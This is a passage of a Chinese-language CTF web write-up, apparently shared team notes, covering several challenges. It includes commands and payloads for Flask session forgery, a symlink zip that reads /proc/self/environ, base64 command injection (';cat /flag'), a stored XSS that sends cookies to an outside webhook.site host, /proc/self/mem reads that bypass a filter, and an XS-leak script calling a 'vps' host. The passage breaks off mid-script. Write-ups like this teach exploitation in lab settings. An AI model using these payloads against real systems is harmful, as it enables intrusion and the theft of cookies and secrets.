class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br></pre></td></tr></table></figure>

<p>flask框架，可以伪造cookie，提权成为admin</p>
<p>F12 拿到 <code>session</code> 值：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="property">eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o</span>.<span class="property">aMWELw</span>.<span class="property">v5h1usGUxthaNUHNEsbaahdZNzU</span></span><br></pre></td></tr></table></figure>

<p>利用解压软链接读文件 <code>/proc/self/environ</code> ，获取 <code>FLASK_SECRET_KEY</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ env_link</span><br><span class="line">zip --symlinks env_link.<span class="property">zip</span> env_link</span><br></pre></td></tr></table></figure>

<p>获取的  <code>FLASK_SECRET_KEY</code>为 <code>&quot;#mu0cw9F#7bBCoF!&quot;</code></p>
<p>使用flask-unsign 解码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign</span><br><span class="line">flask-unsign -d -c <span class="string">&quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNU&quot;</span></span><br><span class="line">flask-cookie.<span class="property">py</span></span><br><span class="line">python3 flask-cookie.<span class="property">py</span> decode -c <span class="string">&quot;.eJyrVirKz0lVslIqLU4tUtIBU3mJuTARQ6VaAMhpC2o.aMWELw.v5h1usGUxthaNUHNEsbaahdZNzU&quot;</span></span><br></pre></td></tr></table></figure>

<p>得到 <code>{&#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;user1&#39;}</code>，修改为<code>{&#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;}</code>之后再编码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign -s --secret <span class="string">&quot;#mu0cw9F#7bBCoF!&quot;</span> --cookie <span class="string">&#x27;&#123;&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;user1&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6InVzZXIxIn0.aOdnGQ.ZfSk9U-Tb1F0jSNyW6O3JcojLvY</span></span><br></pre></td></tr></table></figure>

<p>然后更新cookie值，构造指向根目录 &#x2F; 的软链接：@周怡 ，同时指定文件夹名为 <code>.</code>@董明洋 </p>
<p>这个我没做出来直接链接目录，返回是报错的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / root_link</span><br><span class="line">zip --symlinks root_link.<span class="property">zip</span> root_link</span><br></pre></td></tr></table></figure>

<p>上传之后，访问 <code>/download/root_link</code> 即可获取根目录文件列表，下载flagxxxxx.txt文件即可</p>
<h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>提供 <code>ping</code> 功能，用户输入合法 <code>ip</code> 地址，返回 <code>ping</code> 的结果</p>
<p><img src="/1763435254333-6.png" alt="img"></p>
<p>根据Dockerfile提示，FLAG存放在根目录</p>
<p>用户输入 <code>ip</code> 主要在 <code>run_ping</code> 函数中进行处理</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用base64.b64decode解码得到decoded_ip，并进行一系列检查</span></span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 对为解码的 ip_base64 进行检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 最后拼接到 command 的是 base64 -d ip_base64 的结构</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(command, shell=<span class="literal">True</span>, check=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure>

<p>对解码后的 <code>decoded_ip</code> 做了一系列的检查，但是拼接到 <code>command</code> 的是未解码<code>ip_base64</code></p>
<p>关键在于找出 <code>base64.b64decode</code> 和 <code>base64 -d</code> 的区别</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编码</span></span><br><span class="line"><span class="built_in">echo</span> -n 8.8.8.8 | <span class="built_in">base64</span>                            <span class="comment"># 输出 OC44LjguOA==</span></span><br><span class="line"><span class="comment"># 使用 base64.b64decode 解码（python）</span></span><br><span class="line">base64.b64decode(<span class="string">&quot;OC44LjguOA==OC44LjguOA==&quot;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 仅输出 8.8.8.8 </span></span><br><span class="line"><span class="comment"># 使用 base64 -d 解码</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;OC44LjguOA==OC44LjguOA==&quot;</span> | <span class="built_in">base64</span> -d      <span class="comment"># 输出 8.8.8.88.8.8.8 </span></span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 依次获取 8.8.8.8、&#x27;;ls /&#x27;和&#x27;cat /flag&#x27; 的base64编码</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;8.8.8.8&quot;</span> | <span class="built_in">base64</span>      <span class="comment"># OC44LjguOA==</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;;ls /&quot;</span> | <span class="built_in">base64</span>        <span class="comment"># O2xzIC8=</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;;cat /flag&quot;</span> | <span class="built_in">base64</span>   <span class="comment"># O2NhdCAvZmxhZw==</span></span><br></pre></td></tr></table></figure>

<p>正常<code>ping</code> 一个<code>ip</code>地址，bp改包依次获取 根目录文件，查看<code>/flag</code>内容</p>
<p><img src="/1763435254333-7.png" alt="img"></p>
<h3 id="unfinished"><a href="#unfinished" class="headerlink" title="unfinished"></a>unfinished</h3><p>用户注册、登录之后，可写入笔记、然后提交审核，典型XSS</p>
<p>flag存放在网页的cookie中</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.add_cookies([&#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">    <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span></span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>

<p>关键是判断xss点，以及怎么触发</p>
<p>从<code>/profile</code>中写入的内容会被存放在当前用户的 <code>bio</code>，</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        current_user.bio = request.form[<span class="string">&#x27;bio&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(current_user.bio)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;profile.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>提供 <code>/api/bio/&lt;string:username&gt;</code>访问写入的 bio，但是直接访问返回 403</p>
<p>查看 nginx.conf 配置文件：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">location /api/bio/ &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br><span class="line">location ~ \.(css|js)$ &#123;</span><br><span class="line">    proxy_pass <span class="attr">http</span>:<span class="comment">//127.0.0.1:5000;</span></span><br><span class="line">    proxy_ignore_headers <span class="title class_">Vary</span>;</span><br><span class="line">    proxy_cache static_cache;      <span class="comment">// 启用 Nginx 缓存，缓存区域叫 static_cache</span></span><br><span class="line">    proxy_cache_valid <span class="number">200</span> 10m;     <span class="comment">// 缓存有效期为 10 分钟</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当请求的路径以 “.css”或者“.js”结尾时，就读取缓存的内容，而不是请求远程服务器。就可以绕过 <code>/api/bio</code> 的访问限制</p>
<p>通过 <code>/view</code> 路由触发机器人通过 visit_url 函数访问 我们写入 bio 的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/view&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_user</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    # I found a bug in it.</span></span><br><span class="line"><span class="string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>,default=current_user.username)</span><br><span class="line">    visit_url(<span class="string">f&quot;http://localhost/api/bio/<span class="subst">&#123;username&#125;</span>&quot;</span>)    <span class="comment"># 访问 bio</span></span><br><span class="line">    template = <span class="string">f&quot;&quot;&quot;&#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;...&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_value = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;fake&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> sync_playwright() <span class="keyword">as</span> p:</span><br><span class="line">            context.add_cookies([&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;value&#x27;</span>: flag_value,</span><br><span class="line">                <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;httponly&#x27;</span>: <span class="literal">True</span>    <span class="comment">#  httpOnly不是httponly</span></span><br><span class="line">            &#125;])</span><br><span class="line">            ......</span><br><span class="line">            page.goto(url, timeout=<span class="number">5000</span>)    <span class="comment"># 若访问的 url 页面中存在xss，则可以带出cookie</span></span><br><span class="line">            page.wait_for_timeout(<span class="number">5000</span>)</span><br><span class="line">            browser.close()</span><br></pre></td></tr></table></figure>

<p>思路如下：</p>
<p>注册用户名：<code>user.css</code></p>
<p>将payload写入 <code>bio</code>，<code>payload</code>如下：@周怡 这个payload是错的</p>
<p>@董明洋 我用这个flag打通了，带出来的flag：</p>
<p> <a target="_blank" rel="noopener" href="https://webhook.site/93b23081-7d19-4f29-b538-d884092906b3/flag=flag%7ByOU_F1n15HeD_Th3_unFInisH3D_cHalLen93_MaBhw%7D">https://webhook.site/93b23081-7d19-4f29-b538-d884092906b3/flag=flag%7ByOU_F1n15HeD_Th3_unFInisH3D_cHalLen93_MaBhw%7D</a></p>
<p>不应该啊，这里的没加 <code> </code> 理论上这是个错误的语句</p>
<p>哦哦，这个是格式的问题，我在本地typora上有&#96;&#96;的，不知道怎么操作的复制过来就消失了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">`https://webhook.site/b615b48c-adb7-4e53-97b6-ef4b71b4fa8f/<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>`</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>访问 <code>/api/bio/user.css</code> ,生成缓存</p>
<p>然后在访问 &#x2F;view ，触发机器人读取 payload，并将cookie值带出</p>
<p><img src="/1763435254333-8.png" alt="img"></p>
<h3 id="peekafork"><a href="#peekafork" class="headerlink" title="peekafork"></a>peekafork</h3><p>处理HTTP请求，并根据请求的文件名和offset读取文件内容</p>
<p>flag被写入某段内存中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">        conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]   <span class="comment"># 取出请求路径</span></span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)    <span class="comment"># 匹配 ?offset=12&amp;length=123。仅匹配第一个</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()  <span class="comment"># 去除首尾 &#x27;/&#x27;，得到filename</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 读取 filename 文件内容</span></span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br></pre></td></tr></table></figure>

<p>读取 &#x2F;proc&#x2F;self&#x2F;maps 查看flag存放的偏移 offset</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /?offset=<span class="number">0</span>&amp;length=<span class="number">100000000000.</span>?offset=<span class="number">1</span>&amp;length=<span class="number">100</span>/.?offset=<span class="number">1</span>&amp;length=<span class="number">100.</span>?offset=<span class="number">1</span>&amp;length=<span class="number">100</span>/pro?offset=<span class="number">1</span>&amp;length=100c/self/maps</span><br></pre></td></tr></table></figure>

<p>得到maps：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">11653</span></span><br><span class="line"></span><br><span class="line">7fe58e045000-7fe58e047000 r--p <span class="number">00009000</span> <span class="number">103</span>:<span class="number">00</span> <span class="number">15524094</span>                  /usr/local/lib/python3<span class="number">.12</span>/lib-dynload/_blake2.<span class="property">cpython</span>-<span class="number">312</span>-x86_64-linux-gnu.<span class="property">so</span></span><br><span class="line">7fe58f5c8000-7fe58f5c9000 rw-s <span class="number">00000000</span> <span class="number">00</span>:<span class="number">01</span> <span class="number">5143</span>                       /dev/<span class="title function_">zero</span> (deleted)</span><br><span class="line">7fe58f5c9000-7fe58f5cb000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line">7fe58f5cb000-7fe58f5cc000 r--p <span class="number">00000000</span> <span class="number">103</span>:<span class="number">00</span> <span class="number">15520122</span>                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line">7fe58f602000-7fe58f603000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </span><br><span class="line">7ffec822a000-7ffec824b000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [stack]</span><br><span class="line">7ffec83da000-7ffec83de000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [vvar]</span><br><span class="line">7ffec83de000-7ffec83e0000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>根据本地python的对比测试，<code>mmap</code>后会有一个叫做 <code>/dev/zero (deleted)</code>的内存空间被分配出来 根据它的地址从<code>mem</code>中读取<code>mmap</code>到的flag</p>
<p>读取 <code>/proc/self/mem</code> 文件，<code>offset</code>设置为十进制的<code>0x7fe58f5c8000</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /?offset=<span class="number">140623929442304</span>&amp;length=<span class="number">4096.</span>?offset=<span class="number">1</span>&amp;length=<span class="number">100</span>/.?offset=<span class="number">1</span>&amp;length=<span class="number">100.</span>?offset=<span class="number">1</span>&amp;length=<span class="number">100</span>/pro?offset=<span class="number">1</span>&amp;length=100c/self/mem</span><br></pre></td></tr></table></figure>

<p>拿到FLAG</p>
<p><img src="/1763435254333-9.png" alt="img"></p>
<h3 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h3><p>Rust api 题目</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        .<span class="title function_">route</span>(<span class="string">&quot;/search&quot;</span>, <span class="title function_">get</span>(<span class="attr">route</span>::public_search))</span><br><span class="line">        .<span class="title function_">route</span>(<span class="string">&quot;/internal/search&quot;</span>, <span class="title function_">get</span>(<span class="attr">route</span>::private_search))</span><br><span class="line"><span class="comment">// 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问</span></span><br></pre></td></tr></table></figure>

<p>代码里能看出 肯定是要bot 访问 private_search</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn.<span class="title function_">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br></pre></td></tr></table></figure>

<p>Search 的sql语法有模糊匹配，且匹配成功为http 返回状态码为200，失败为500</p>
<p>则可以xs-leak，根据状态码注出完整的flag</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> url = <span class="string">&#x27;http://0.0.0.0:8000/internal/search?s=&#x27;</span> + flag;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        script.<span class="property">src</span> = url;</span><br><span class="line">        script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://vps/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;);</span><br><span class="line">            <span class="title function_">leak</span>(flag);</span><br><span class="line">            script.<span class="title function_">remove</span>();</span><br><span class="line">        &#125;;</span><br><span class="line">        script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dicts = <span class="string">&#x27;abcdef0123456789-&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">let</span> char = 